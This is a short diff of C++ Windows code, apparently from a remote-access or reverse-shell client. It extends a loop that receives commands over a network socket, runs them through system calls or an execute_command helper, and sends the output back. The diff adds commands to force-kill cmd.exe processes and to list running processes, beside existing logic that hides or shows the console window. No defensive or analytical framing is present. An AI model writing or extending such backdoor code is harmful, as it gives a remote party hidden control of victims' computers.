@@ -113,9 +113,19 @@ int main() {
             {
                 HWND hWnd = GetConsoleWindow();
                 ShowWindow(hWnd, SW_SHOW);
+			}
+			else if (command == "kill")
+			{
+				system("taskkill /f /im cmd.exe");
+			}
+			else if (command == "list")
+			{
+				system("tasklist");
+			}
+            else {
+                output.clear();
+                execute_command(command, output);
             }
-            output.clear();
-            execute_command(command, output);
             send(ConnectSocket, output.c_str(), output.length(), 0);
         }
         else if (iResult == 0) {
